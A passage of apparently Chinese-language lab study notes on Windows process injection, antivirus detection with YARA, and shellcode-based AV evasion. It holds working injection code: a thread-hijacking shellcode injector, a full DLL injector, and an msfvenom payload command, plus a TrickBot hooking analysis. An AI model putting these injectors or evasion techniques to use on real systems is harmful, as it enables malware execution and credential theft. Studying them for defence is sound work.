&quot;\\x80\\x63\\x80\\x6f\\x17\\xa1\\xe8\\x5b\\x25\\x2f\\xa0\\x56\\xcc\\xb5&quot; &quot;\\x88\\xd8\\x20\\x32\\x38\\x22\\xc4\\x8b\\x8d\\xd8\\x6c\\x5e\\x35\\xa8&quot; &quot;\\x54\\xf1\\x85\\x52\\xb0\\x57\\xfa\\x27\\x9c\\xa5\\xcd\\x83\\x21\\x4e&quot; &quot;\\x30\\x7b\\x4a\\xb4\\x96\\x12\\x38\\x57\\x28\\x62\\x4e\\xa5\\x4f\\xbf&quot; &quot;\\x40\\x57\\x23\\xdc\\xf4\\xb5\\x8d\\x0a\\x3a\\x5e\\xfa\\x31\\xfd\\xba&quot; &quot;\\x33\\xac\\x9f\\x4b\\x39\\x99\\x15\\xed\\xcc\\x53\\x60\\x16\\x71\\x23&quot; &quot;\\x5c\\x60\\x41\\x52\\x61\\x16\\x71\\x62\\xae\\xdc\\x47\\x3c\\xe7\\xe9&quot; &quot;\\xa4\\x98\\xe4\\x58\\x6e\\x05\\x21\\xac\\xd7\\xb6\\xa9\\x70\\x33\\x86&quot; &quot;\\x28\\x95\\xb5\\x0b\\x28\\xeb\\xb0\\x59\\xe0\\xed\\x91\\x56\\x11\\x56&quot; &quot;\\x8b\\x40\\x12\\x79\\x1b\\x23\\x4d\\xac\\x45\\x89\\x9f\\xc3\\x12\\x42&quot; &quot;\\x78\\x8e\\xcc&quot;; int main(int argc, char *argv[]) { HANDLE h_thread = NULL; THREADENTRY32 threadEntry; CONTEXT context; context.ContextFlags = CONTEXT_FULL; threadEntry.dwSize = sizeof(THREADENTRY32); HANDLE h_process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (atoi(argv[1]))); PVOID b_shellcode = VirtualAllocEx(h_process, NULL, sizeof shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE); WriteProcessMemory(h_process, b_shellcode, shellcode, sizeof shellcode, NULL); HANDLE h_snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0); Thread32First(h_snapshot, &amp;threadEntry); do { if (threadEntry.th32OwnerProcessID == (atoi(argv[1]))) { h_thread = OpenThread(THREAD_ALL_ACCESS, FALSE, threadEntry.th32ThreadID); break; } } while (Thread32Next(h_snapshot, &amp;threadEntry)); if (h_thread) { SuspendThread(h_thread); GetThreadContext(h_thread, &amp;context); context.Rip = (DWORD_PTR)b_shellcode; SetThreadContext(h_thread, &amp;context); ResumeThread(h_thread); printf(&quot;Inject Success!\\n&quot;); } else { printf(&quot;Thread Not Found!\\n&quot;); } } Abusing DLLs 滥用 DLLDLL 注入可以分为6个步骤： 找到要注入的目标进程。 打开目标进程。 为恶意 DLL 分配内存区域。 将恶意 DLL 写入分配的内存。 加载并执行恶意 DLL。 在 DLL 注入的第一步，我们必须找到一个目标线程。可以使用三个 Windows API 调用从进程中找到一个线程：CreateToolhelp32Snapshot() 、 Process32First() 和 Process32Next()，这个和上一节中是一样的，不过是通过遍历线程了。Thread32 和 Process32 的区别。 123456789101112131415161718192021DWORD getProcessId(const char *processName){ // 打快照 HANDLE hSnapshot = CreateToolhelp32Snapshot( TH32CS_SNAPPROCESS, // 快照系统中的所有线程 0); if (hSnapshot){ PROCESSENTRY32 entry; // 创建 PROCESSENTRY32 结构体指针 entry.dwSize = sizeof(PROCESSENTRY32); // 预先设置结构体的大小 if (Process32First(hSnapshot, &amp;entry)){ do { // 从结构体指针里面取出进程名和提供的进程名进行比对 if (!strcmp(entry.szExeFile, processName)){ return entry.th32ProcessID; // 返回比对成功的 PID } } while (Process32Next(hSnapshot, &amp;entry)); } } } // 存储进程 PID DWORD processId = getProcessId(processName); 第二步，枚举出 PID 后，我们需要打开进程。这可以通过多种 Windows API 调用实现： GetModuleHandle 、 GetProcAddress 或 OpenProcess 。 第三步，必须为提供的恶意 DLL 分配内存。与大多数注入器一样，这可以通过 VirtualAllocEx 来完成。 第四步，我们需要将恶意 DLL 写入已分配的内存位置。我们可以使用 WriteProcessMemory 来写入已分配的区域。 这里我不太理解为什么前面分配内存的时候不 + 1，按理说分配的大小要超过能写入的大小吧，这里写入的大小都超过分配内存区域的大小了，难道不报错？ 1234567891011121314151617// 通过 PID 获取进程的句柄 HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId); // 在目标进程的地址空间中给 DLL 分配内存，返回一个指针地址 LPVOID dllAllocatedMemory = VirtualAllocEx(hProcess, NULL, strlen(dllLibFullPath), // DLL 路径文本本身的大小 MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE ); // 写入内存 WriteProcessMemory( hProcess, dllAllocatedMemory, // 分配内存区域的指针 dllLibFullPath, // 恶意 DLL 的路径 strlen(dllLibFullPath) + 1, // 确保字符后面的 \\0 也写入进去 NULL ); 最后，我们使用 CreateRemoteThread 在目标进程中创建一个新线程。该线程的起始地址指向 kernel32.dll 中的 LoadLibraryA 函数，并将我们写入的 DLL 路径作为参数传递给它。 12345678910111213LPVOID loadLibrary = (LPVOID) GetProcAddress( GetModuleHandle(&quot;kernel32.dll&quot;), // 包含需要调用的 API 的模块的句柄 &quot;LoadLibraryA&quot; // 要导入的 API 调用 ); HANDLE remoteThreadHandler = CreateRemoteThread( hProcess, NULL, 0, // 使用线程的默认堆栈大小 (LPTHREAD_START_ROUTINE) loadLibrary // 指向 API 起始函数的指针 dllAllocatedMemory, // 指向分配好内存区域的指针 0, // 创建后立即执行 NULL ); 实践说实话有点折腾人了，这里由于 ANSI 和 Unicode 的问题弄了很久。两套兼容方式也够折磨人的，不愧是 Microshit。 前面 GetProcessId 方法那里，Process32First 只给了一种实现，用的是 Unicode 编码，即 wchar_t 类型。 1234567#ifdef UNICODE #define Process32First Process32FirstW #define Process32Next Process32NextW #define PROCESSENTRY32 PROCESSENTRY32W #define PPROCESSENTRY32 PPROCESSENTRY32W #define LPPROCESSENTRY32 LPPROCESSENTRY32W #endif // !UNICODE 从内存视图里面可以看到从结构体里面获取的字符串都高位有一个 \\00，这是 UTF-16 的特性。而我们传入的 processName 又是 ANSI 编码的，这就会导致 strcmp 返回不了正确的结果。 所以这里要写一个函数，把 ANSI 字符串转换为 wchar_t 类型。 好，这里解决了，下面有一个 GetFullPathName 方法，这个函数呢，有两种版本。但默认情况下，Visual Studio 项目是配置为 Unicode 的。这意味着 GetFullPathName 实际上调用的是 GetFullPathNameW。这下就导致 dllLibFullPath 接收到的是一个 wchar_t 类型，而系统又是把他当成 char 来对待。我 debug 的时候就发现他输出一个字符就不输出了。不过这里用 GetFullPathNameA 就解决了。 后面导入 LoadLibrary 方法的时候，要用 GetModuleHandleA ，至此解决了所有问题，可以注入 DLL 了。 解决这个的过程要善用调试工具，折腾这一下把 VS Studio 调试熟悉了。 如果你想通过调试查看 DLL 是否加载进程序了，通过 VS Studio 这个 Debug 是不够的，因为我们是注入到目标程序里面了，所以那一块的内存区域要用其他方式去读取。 用到的 DLL 是 msfvenom 生成的，你可以用以下代码生成 DLL。 1msfvenom -p windows/x64/exec cmd=&quot;calc&quot; -b &quot;\\x00&quot; -f dll -o calc.dll 以下是我修改好的 dll-injector： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293#include &lt;windows.h&gt; #include &lt;stdio.h&gt; #include &lt;tlhelp32.h&gt; #include &lt;string.h&gt; #include &lt;wchar.h&gt; // 将 ANSI 字符串转换为宽字符 // 这是一个简单的辅助函数 wchar_t* AnsiToWideChar(const char* ansiStr) { int len = MultiByteToWideChar(CP_ACP, 0, ansiStr, -1, NULL, 0); wchar_t* wideStr = (wchar_t*)malloc(len * sizeof(wchar_t)); MultiByteToWideChar(CP_ACP, 0, ansiStr, -1, wideStr, len); return wideStr; } DWORD getProcessId(const char* processName) { HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); if (hSnapshot) { PROCESSENTRY32 entry; entry.dwSize = sizeof(PROCESSENTRY32); if (Process32First(hSnapshot, &amp;entry)) { do { wchar_t* wideProcessName = AnsiToWideChar(processName); //printf(&quot;%s\\n&quot;, processName); //wprintf(L&quot;%s\\n&quot;, entry.szExeFile); if (!strcmp(entry.szExeFile, wideProcessName)) { printf(&quot;Found!\\n&quot;); return entry.th32ProcessID; } } while (Process32Next(hSnapshot, &amp;entry)); } } else { return 0; } } int main(int argc, char* argv[]) { if (argc != 3) { printf(&quot;Cannot find require parameters\\n&quot;); printf(&quot;Usage: dll-injector.exe &lt;process name&gt; &lt;path to DLL&gt;\\n&quot;); exit(0); } char dllLibFullPath[256]; LPCSTR processName = argv[1]; LPCSTR dllLibName = argv[2]; DWORD processId = getProcessId(processName); printf(&quot;processId: %d\\n&quot;, (int)processId); if (!processId) { printf(&quot;ProcessId Failed\\n&quot;); exit(1); } if (!GetFullPathNameA(dllLibName, sizeof(dllLibFullPath), dllLibFullPath, NULL)) { printf(&quot;GetFullPathName Failed\\n&quot;); exit(1); } HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId); if (hProcess == NULL) { printf(&quot;hProcess Failed\\n&quot;); exit(1); } LPVOID dllAllocatedMemory = VirtualAllocEx(hProcess, NULL, strlen(dllLibFullPath), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE); if (dllAllocatedMemory == NULL) { printf(&quot;dllAllocatedMemory Failed\\n&quot;); exit(1); } if (!WriteProcessMemory(hProcess, dllAllocatedMemory, dllLibFullPath, strlen(dllLibFullPath) + 1, NULL)) { printf(&quot;WriteProcessMemory Failed\\n&quot;); exit(1); } LPVOID loadLibrary = (LPVOID)GetProcAddress(GetModuleHandleA(&quot;kernel32.dll&quot;), &quot;LoadLibraryA&quot;); HANDLE remoteThreadHandler = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)loadLibrary, dllAllocatedMemory, 0, NULL); if (remoteThreadHandler == NULL) { printf(&quot;remoteThreadHandler Failed\\n&quot;); DWORD error_code = GetLastError(); printf(&quot;CreateRemoteThread failed. Error Code: %lu\\n&quot;, error_code); exit(1); } CloseHandle(hProcess); return 0; } Memory Execution Alternatives 内存执行替代根据处于环境的不同，可能需要更改执行 shellcode 的方式。这通常发生在有些 API 被 Hook 了，但是没法绕过他，或者 EDR 在监视线程。 目前为止，我们已经研究了在本地&#x2F;远程进程之间分配和写入数据的方法，执行也是任何注入技术中的关键一步；尽管在尝试最小化内存痕迹和 IOC 时，它并不那么重要。与分配和写入数据不同，执行有许多选项可供选择。前面几个任务我们通过 CreateThread 和 CreateRemoteThread 方法执行 shellcode 过，这里介绍另外三种执行方法。 Invoking Function Pointers 调用函数指针这种方法的核心在于利用 C 语言的特性，将一个内存地址强制转换为函数指针，并直接调用。它不依赖额外的 API 调用来执行，但代码所在的内存区域必须是可执行的。虽然最常用于本地分配的内存，但在远程进程中，如果能获取到正确的地址并修改该进程的寄存器，理论上也可以利用。 1((void(*)())addressPointer)(); (void(*)())。这是一个类型转换。它将后面的 addressPointer 强制转换成一个函数指针类型。 *: 表示这是一个指针。 (): 括号中的内容描述了该指针指向的函数的类型。 void: 括号前面的 void 表示该函数没有返回值。 (): 括号里面的 () 表示该函数没有参数。 addressPointer 是一个变量，它包含了你想要执行的代码的内存地址。通常，这个地址是在内存中动态分配或加载的。 () 是函数调用操作符 整个过程就是将一个内存地址（addressPointer）强制视为一个没有参数和返回值的函数，然后立即调用它。 这种技术的使用场景非常特殊，但在需要时会非常隐蔽和有用。 Asynchronous Procedure Calls 异步过程调用 Asynchronous Procedure Calls Asyncrhonous Procedure Calls (APC) 是一种在指定线程中异步执行函数的机制。 简单来说，APC 就像是把你的恶意代码加入一个队列。当目标线程进入一个**可警报状态（alertable state）**时，它就会从队列中取出并执行你的代码，从而劫持线程的执行流。 APC 函数通过 QueueUserAPC 排队到线程。一旦排队成功，APC 函数就会导致一个软件中断，并在线程下一次被调度时执行该函数。为了让用户模式应用程序将 APC 函数排入队列，目标线程必须处于“可警报状态”。 可警报状态通常指的是线程正在执行一个等待函数，比如 WaitForSingleObject 或 Sleep。 这里我们假设已经把我们的 Shellcode 写入到内存了，addressPointer 是我们写入好的内存地址，pinfo 是获取到的 PROCESS_INFORMATION 结构体。 12345678910111213141516QueueUserAPC( (PAPCFUNC)addressPointer, // APC 函数指针，指向我们已注入的 Shellcode 地址 pinfo.hThread, // 目标线程的句柄，从 PROCESS_INFORMATION 结构体获取 (ULONG_PTR)NULL // 传递给 APC 函数的参数，这里为空 ); // 恢复线程执行 ResumeThread( pinfo.hThread // 目标线程的句柄 ); // 等待线程执行完毕 WaitForSingleObject( pinfo.hThread, // 目标线程的句柄 INFINITE // 无限等待，直到线程结束或被唤醒 ); Section Manipulation 节区操作这个技术的核心是直接修改 PE (Portable Executable) 文件的内部结构，而不是简单地对代码进行加密或混淆。PE 文件是 Windows 可执行文件的基本格式，由不同的节区 (Sections) 组成，比如存放代码的 .text 节和存放数据的 .data 节。 PE 文件转储 (PE Dump)：首先，攻击者需要用工具（如 xxd）将恶意文件（如 DLL 或 Shellcode）的原始二进制数据提取出来。 数学运算：然后，利用复杂的数学运算，计算出代码和数据在 PE 文件中的相对虚拟地址 (RVA)，这是 PE 文件中用来定位内容的相对偏移量。 高级技术：利用这些 RVA，攻击者可以采用更精妙的手段来隐藏恶意代码： RVA 入口点解析：修改 PE 文件头的入口点，将其指向恶意代码，从而让系统在加载文件时直接执行注入的代码。 节区映射：在 PE 文件中创建新的节区，或修改现有节区的权限，以容纳恶意代码。 重定位表解析：修改重定位表，确保注入的代码在程序加载到内存中的任意地址时都能正常运行。 与常见混淆技术的区别 与常见的 XOR 或 Base64 加密等混淆技术相比，节区操作是一种更底层、更高级的防御规避手段。 混淆&#x2F;加密：改变的是代码的外观，以躲避杀毒软件的签名检测。 节区操作：改变的是文件的内部结构和物理布局，旨在欺骗静态和动态分析工具，让恶意代码看起来像是文件本身的一个合法部分。 案例分析来自 SentinelLabs 的报告，这是一个 TrickBot 的 TTP 的分析报告。 TrickBot 是最近在金融犯罪软件领域重新流行起来的一种著名的银行恶意软件。 这里我们分析的是这个恶意软件的 Hook 浏览器的功能，他能 Hook 浏览器的 API 去拦截和窃取凭据。 我们先来看看它们是如何针对浏览器的。这段反汇编代码显示了 push offset 指令，这表明在调用 OpenProcess 之前，恶意软件正在将不同的浏览器可执行文件名（chrome.exe, iexplore.exe, firefox.exe 等）作为参数压入堆栈，以便逐一尝试打开它们。这表明了 TrickBot 在寻找一个可注入的目标。你的分析是正确的，它通过 OpenProcess 来获取浏览器进程的句柄。 1234567891011121314151617181920212223push eax push 0 push 438h call ds:OpenProcess mov edi, eax mov [edp,hProcess], edi test edi, edi jz loc_100045EE -------------------------------- push offset Srch ; \"chrome.exe\" lea eax, [ebp+pe.szExeFile] ... mov eax, ecx push offset aIexplore_exe ; \"iexplore.exe\" push eax ; lpFirst ... mov eax, ecx push offset aFirefox_exe ; \"firefox.exe\" push eax ; lpFirst ... mov eax, ecx push offset aMicrosoftedgec ; \"microsoftedgecp.exe\" ... 反射性注入的当前源代码尚不明确，但 SentinelLabs 已在下方概述了注入的基本程序流程。 打开目标进程（OpenProcess） 分配内存（VirtualAllocEx） 复制钩子安装程序到分配的内存里（WriteProcessMemory） 复制 Shellcode 到分配的内存里（WriteProcessMemory） 刷新缓存（FlushInstructionCache） 创建远程线程，让它去执行钩子安装程序（CreateRemoteThread）。 该新线程在执行钩子安装程序后，可能会创建一个新线程（RtlCreateUserThread）或恢复被挂起的线程。 一旦注入，TrickBot 将调用其钩子安装程序函数，该函数已在第三步复制到内存中。SentinelLabs 在下方提供了安装程序函数的伪代码。 123456789101112131415161718192021222324252627282930313233343536// 计算我们恶意函数和原始函数中的偏移量 // + 1 是跳过 jmp 直接访问后面的 32 位偏移量 // 这里的 -5 是用来抵消跳转指令本身的长度 relative_offset = myHook_function - *(_DWORD *)(original_function + 1) - 5; // 获取要被覆盖的原始指令的长度 v8 = (unsigned __int8)original_function[5]; // 记住原来函数所在的地址 + 1 是为了跳过 jmp 直接访问后面的 32 位偏移量 trampoline_lpvoid = *(void **)(original_function + 1); // &quot;0xE9&quot; 是跳转指令的机器码，即 jmp jmp_32_bit_relative_offset_opcode = 0xE9u; // 修改内存页的保护属性 让代码能写入这块内存 if ( VirtualProtectEx((HANDLE)0xFFFFFFFF, trampoline_lpvoid, v8, 0x40u, &amp;flOldProtect) ) { // 这一部分没看明白 original_function 我不知道是什么 // 很可能是指浏览器中被钩子劫持的那个原始 API 函数 // 写入内存只有下面那一个方法，而且写的是 opcode v10 = *(_DWORD *)(original_function + 1); v11 = (unsigned __int8)original_function[5] - (_DWORD)original_function - 0x47; original_function[66] = 0xE9u; // 这里相当于 original_function[67] *(_DWORD *)(original_function + 0x43) = v10 + v11; // 手动写入内存 write_hook_iter(v10, &amp;jmp_32_bit_relative_offset_opcode, 5); // 还原原始保护状态 VirtualProtectEx( (HANDLE)0xFFFFFFFF, *(LPVOID *)(original_function + 1), (unsigned __int8)original_function[5], flOldProtect, &amp;flOldProtect); result = 1; 先丢在这里，之后实践的时候再研究。 总结这个房间就涵盖了注入的很多种方式，之前自己也看过一些注入手段，用的是未被公开的 API 来注入，绕过杀毒软件。就算我有这些基础，完成这个房间也是挺困难的，不过房间难度是 Hard，也正常吧。 Introduction to Antivirus这个房间就简单的介绍了一下杀毒软件，概念性的比较多，后面的 yara 值得学习一下，能理解杀软是如何通过签名鉴定文件是否存在威胁的。 传统杀毒软件通过记录的文件指纹来查找恶意软件，现代杀毒软件通过整合多种技术，从静态到动态，构建了一个全面的防御体系，以识别和拦截不断演变的恶意软件。 1. 核心：多层级检测 静态检测（Signature-Based）：这是最基础的防线。它通过模式匹配，在恶意文件被执行之前，就扫描其独特的文件指纹（如哈希值、特定字节序列或字符串）。这种方式速度快，但容易被简单的文件修改（如加壳、混淆）绕过。 启发式检测（Heuristic）：为了弥补静态检测的不足，启发式分析会根据代码的行为模式来判断其恶意性。例如，一个程序在没有用户交互的情况下试图访问系统关键区域，就可能被标记为可疑。 动态检测（Behavioral）：这是最高级的防御层。杀毒软件会将可疑文件放入一个隔离的**沙箱（Sandbox）**环境中执行，并**模拟**其所有行为。通过监控以下活动来识别恶意意图： API 调用：是否调用了危险的系统函数，如创建新进程、修改注册表等。 文件系统修改：是否试图删除、修改或加密用户文件。 网络请求：是否试图连接到可疑的命令与控制服务器。 2. 辅助功能：处理复杂威胁 解压&#x2F;解包（Decompression&#x2F;Unpacking）：许多恶意软件会使用加壳或加密技术来隐藏其真实代码。杀毒软件的解包器能够还原这些文件，暴露其原始代码，以便进行静态分析。 模拟器（Emulator）：模拟器是沙箱的核心组件，它在不影响真实系统的情况下，运行和分析恶意代码的每一个指令，从而发现其隐藏的行为。 静态检测静态检测技术是最简单的杀毒软件检测类型，它基于恶意文件的预定义签名。简单来说，它在检测中使用模式匹配技术，例如查找唯一的字符串、CRC（校验和）、字节码&#x2F;十六进制值序列以及加密哈希（MD5、SHA1 等）。 工具快捷看 Hash 工具 OpenHashTab 资源管理器集成，挺方便的 PEiD 看打包器 文件实际类型 文件头：https://filesig.search.org/ 这里用到的是一个 yara 工具，一个很强大的自定义静态扫描工具 Yara这里是去 Yara 房间里面学习了一下，不是这个房间的内容，但是强烈建议去学一遍再回来。 Room：https://tryhackme.com/room/yara Yara 入门在恶意软件中可能会有一些特征字符串，比如说虚拟币钱包地址，IP 地址，这种就可以作为敏感信息去检测他，而 Yara 就是根据文件呈现的特征或模式来确定文件是否恶意。 yara 命令需要两个参数才能生效，一个是规则文件，一个是目标（要使用该规则的文件名、目录或进程 ID）。 Yara 规则https://yara.readthedocs.io/en/stable/writingrules.html Meta 元数据Yara 规则的这一部分是为规则作者的描述性信息保留的。例如，您可以使用 description（desc 的缩写）来总结您的规则检查的内容。此部分中的任何内容都不会影响规则本身。类似于代码注释，总结您的规则很有用。 Strings 字符串你可以使用字符串在文件或程序中搜索特定的文本或十六进制。例如，假设我们想在一个目录中搜索所有包含“Hello World!”的文件，我们可以创建一个规则，如下所示： 1234rule helloworld_checker{ strings: $hello_world = &quot;Hello World!&quot; } 我们定义关键字 Strings ，其中我们想要搜索的字符串，即“Hello World!”，存储在变量 $hello_world 中。 当然，我们需要一个条件来使规则生效。在这个例子中，要使这个字符串成为条件，我们需要使用变量名。在这种情况下， $hello_world ： 1234567rule helloworld_checker{ strings: $hello_world = &quot;Hello World!&quot; condition: $hello_world } 本质上，如果任何文件包含字符串“Hello World!”，则该规则将匹配。但是，这字面意思是只有找到“Hello World!”时才会匹配，而不会匹配“hello world”或“HELLO WORLD.”。 要解决此问题，条件 any of them 允许搜索多个字符串，如下所示： 123456789rule helloworld_checker{ strings: $hello_world = &quot;Hello World!&quot; $hello_world_lowercase = &quot;hello world&quot; $hello_world_uppercase = &quot;HELLO WORLD&quot; condition: any of them } Conditions 条件我们已经使用了 true 和 any of them 条件。与常规编程非常相似，你可以使用以下运算符： &lt;&#x3D; 小于或等于 &gt;&#x3D; 大于或等于 !&#x3D; 不等于 下面的规则表示：当“Hello World!”字符串出现次数小于或等于十次时，才表示规则匹配 1234567rule helloworld_checker{ strings: $hello_world = &quot;Hello World!&quot; condition: #hello_world &lt;= 10 } Combining keywords 组合关键词 and not or 要组合多个条件。例如，如果你想检查一个文件是否包含某个字符串并且大小符合特定要求（在本例中，我们检查的样本文件小于 10 KB 且包含“Hello World!”），你可以使用如下规则： 1234567rule helloworld_checker{ strings: $hello_world = &quot;Hello World!&quot; condition: $hello_world and filesize &lt; 10KB } Yara 规则剖析handy cheatsheet Yara 模块Cuckoo SandboxCuckoo Sandbox 是一个自动化的恶意软件分析环境。此模块允许您根据 Cuckoo Sandbox 中发现的行为生成 Yara 规则。由于此环境会执行恶意软件，因此您可以根据特定行为（例如运行时字符串等）创建规则。 Python PEPython 的 PE 模块允许你根据 Windows 可移植可执行文件 (PE) 结构的各个部分和元素创建 Yara 规则。 Yara 工具 LOKI 是由 Florian Roth 创建&#x2F;编写的免费开源 IOC（入侵指标）扫描器。 THOR 多平台 IOC 和 YARA 扫描器 FENRIR 一个 bash 脚本 YAYA (Yet Another Yara Automaton) 管理规则库用的 使用 LOKILOKI 是一个自动调用 yara 规则进行扫描的工具 1python loki.py -p . 使用 yarGen 创建 Yara 规则yarGen 是一个 YARA 规则生成器，它能根据恶意软件文件中发现的字符串创建 YARA 规则，同时删除所有在正常软件文件中也出现的字符串。 1234python3 yarGen.py -m /home/cmnatic/suspicious-files/file2 --excludegood -o /home/cmnatic/suspicious-files/file2.yar // 调用 loki 测试我们的文件 python ../tools/Loki/loki.py -p . 修改 Yara 规则原来的规则由于是简单的匹配字符串，导致我们扫描文本文件都会造成假阳，所以我们需要修改匹配规则。 123456789rule thm_demo_rule { meta: author = \"THM: Intro-to-AV-Room\" description = \"Look at how the Yara rule works with ClamAV\" strings: $a = \"C:\\\\Users\\\\thm\\\\source\\\\repos\\\\AV-Check\\\\AV-Check\\\\obj\\\\Debug\\\\AV-Check.pdb\" condition: $a } 这里用一个 Magic Number 来增加一下判断条件，EXE 文件一般是由 4D5A 开始的。 修改后的规则： 12345678910rule thm_demo_rule { meta: author = \"THM: Intro-to-AV-Room\" description = \"Look at how the Yara rule works with ClamAV\" strings: $a = \"C:\\\\Users\\\\thm\\\\source\\\\repos\\\\AV-Check\\\\AV-Check\\\\obj\\\\Debug\\\\AV-Check.pdb\" $b = \"MZ\" condition: $b at 0 and $a } 动态检测第一种方法是通过监控 Windows API。检测引擎会检查 Windows 应用程序调用，并使用 Windows Hooks 监控 Windows API 调用。 第二种动态检测的另一种方法是沙盒。沙盒是一种虚拟化环境，用于运行与主机计算机隔离的恶意文件。这通常在隔离环境中进行，主要目标是分析恶意软件在系统中的行为方式。一旦恶意软件被确认，将根据二进制文件的特性创建唯一的签名和规则。最后，新的更新将被推送到云数据库以供将来使用。 说实话，比较鸡肋，第一种可以绕过，第二种可以避免。 还有一种就是行为检测了，异常行为不加白的应用直接拦。 识别杀毒软件房间介绍了开源的轮子 SharpEDRChecker，和房间提供的用 C# 写的，我估计还有一些一行的脚本，毕竟这个就是简单的调系统 API 然后字符串匹配。 AV Evasion: Shellcode这个房间介绍免杀技术。 PE 结构什么是 PE之前的房间我们已经聊过这个了，丢一张图过来，更多资料可以参考微软文档。 PE 结构中有不同类型的数据容器，每种容器存储不同的数据。 .text 保存程序的实际代码 .data 保存初始化和定义的变量 .bss 保存未初始化数据（未赋值的声明变量） .rdata 包含只读数据 .edata包含可导出对象和相关表格信息 .idata 导入对象和相关表格信息 .reloc 图像重定位信息 .rsrc 链接程序使用的外部资源，如图像、图标、嵌入式二进制文件和清单文件，清单文件包含程序版本、作者、公司和版权等所有信息！ 以下是 Windows 加载器读取可执行二进制文件并将其作为进程运行的示例步骤。 标头部分：DOS、Windows 和可选标头被解析以提供有关 EXE 文件的信息。例如， 魔术数字以“MZ”开头，这告诉加载器这是一个 EXE 文件。 文件签名 文件是为 x86 还是 x64 CPU 架构编译的。 创建时间戳。 解析节表详情，例如 文件包含的节数。 根据文件内容映射到内存中 EntryPoint 地址和 ImageBase 的偏移量。 RVA：相对虚拟地址，与 Imagebase 相关的地址。 导入、DLL 和其他对象被加载到内存中。 EntryPoint 地址被定位，主执行函数运行。 为什么我们要了解 PE?我们会碰到打包和解包，这个就需要我们了解 PE 结构才知道原理。 另外创建或修改具有针对 Windows 机器的杀毒规避能力的恶意软件，我们需要了解 Windows 可执行文件（PE 文件）的结构以及恶意 shellcode 可以存储的位置。 我们可以通过定义和初始化 shellcode 变量的方式来控制将 shellcode 存储在哪个数据节中。 在主函数中将 shellcode 定义为局部变量会将其存储在 .TEXT 部分（和执行的代码存储在一起）。 将 shellcode 定义为全局变量会将其存储在 .Data 部分。 另一种技术是将 shellcode 作为原始二进制文件存储在图标图像中，并将其链接到代码中，因此在这种情况下，它会显示在.rsrc Data 节中。 我们可以添加一个自定义数据节来存储 shellcode。 ShellcodeShellcode 是一组精心设计的机器代码指令，用于指示易受攻击的程序运行附加功能，并且在大多数情况下，提供对系统 shell 的访问或创建反向命令 shell。 一旦 shellcode 被注入到进程中并由易受攻击的软件或程序执行，它就会修改代码运行流程，以更新程序的寄存器和功能，从而执行攻击者的代码。 它通常用汇编语言编写，并翻译成十六进制操作码（operational codes opcode）。编写独特和自定义的 shellcode 有助于显著规避杀毒软件。但是，编写自定义 shellcode 需要在处理汇编语言方面具备出色的知识和技能，这不是一件容易的事！ Shellcode 入门要制作一个 Shellcode，你需要掌握多项技能，包括对 x86&#x2F;x64 CPU 架构、汇编语言、C 语言以及 Linux&#x2F;Windows 操作系统的深入理解。 制作 Shellcode 的核心步骤是编写汇编代码，然后将其编译并提取出机器码。我们以一个简单的 Shellcode 为例，它将在屏幕上打印字符串 “THM, Rocks!”，然后正常退出程序。这个过程需要用到两个关键的系统调用： sys_write：用于将数据写入文件描述符（这里是标准输出）。 sys_exit：用于终止程序执行。 理解系统调用 (Syscall)系统调用是程序请求操作系统内核执行特定任务的方式。在 64 位 Linux 系统中，每个系统调用都有一个对应的编号，这个编号需要放在 rax 寄存器中。其他参数则通过 rdi、rsi 和 rdx 寄存器传递。 rax System Call rdi rsi rdx 0x1 sys_write unsigned int fd const char *buf size_t count 0x3c sys_exit int error_code 上表告诉我们，要使用系统调用来调用 sys_write 和 sys_exit 函数，我们需要在不同的处理器寄存器中设置哪些值。对于 64 位 Linux，rax 寄存器用于指示我们希望调用的内核函数。将 rax 设置为 0x1 会使内核执行 sys_write，将 rax 设置为 0x3c 会使内核执行 sys_exit。这两个函数都需要一些参数才能工作，这些参数可以通过 rdi、rsi 和 rdx 寄存器设置。 sys_write (0x1)： rdi (文件描述符)：指定要写入的目标。1 通常代表标准输出（屏幕）。 rsi (缓冲区指针)：指向我们要打印的字符串的内存地址。 rdx (计数)：要打印的字符串的字节数。 sys_exit (0x3c)： rdi (退出代码)：指定程序的退出状态。0 表示程序成功执行。 通过在正确的寄存器中设置这些值，我们就可以让程序请求内核完成我们需要的操作。 你可以在这里找到可用 64 位 Linux 系统调用的完整参考。 代码12345678910111213141516171819202122global _start section .text _start: jmp MESSAGE ; 1) 跳转到 MESSAGE GOBACK: mov rax, 0x1 mov rdi, 0x1 pop rsi ; 3) 把堆栈的地址取出来放进 RSI 寄存器 ; 这样就有了我们字符串的地址了 mov rdx, 0xd syscall mov rax, 0x3c mov rdi, 0x0 syscall MESSAGE: call GOBACK ; 2) 他会把下一条指令的地址压入堆栈 db &quot;THM, Rocks!&quot;, 0dh, 0ah 汇编代码的工作原理准备 sys_write 调用 我们将 0x1 存入 rax 寄存器，指示要调用 sys_write。 将 1 存入 rdi 寄存器，指定标准输出（屏幕）。 将字符串的地址存入 rsi 寄存器。为此，我们使用一个技巧：call GOBACK。call 指令会将下一条指令的地址（即我们消息字符串的起始地址）压入堆栈。然后 pop rsi 将其弹出到 rsi 中。 将字符串的长度存入 rdx 寄存器。 最后，使用 syscall 指令执行 sys_write。 准备 sys_exit 调用 将 0x3c 存入 rax 寄存器，指示要调用 sys_exit。 将 0 存入 rdi 寄存器，表示程序成功退出。 使用 syscall 指令执行 sys_exit。 字符串存储 我们的消息字符串“THM, Rocks!”以及换行符 0d, 0a 都被存储在汇编代码的末尾，这样才能利用 call 指令来获取其地址。 生成与测试 Shellcode一旦汇编代码编写完成，我们就可以将其编译并提取为 Shellcode： 编译与链接：使用 nasm 编译 .asm 文件，然后用 ld 链接，生成可执行文件 thm。 12// 编译 + 链接 + 执行 nasm -f elf64 thm.asm &amp;&amp; ld thm.o -o thm &amp;&amp; ./thm 提取 Shellcode：使用 objdump 查看编译后的二进制文件的 .text 段，然后用 objcopy 将 .text 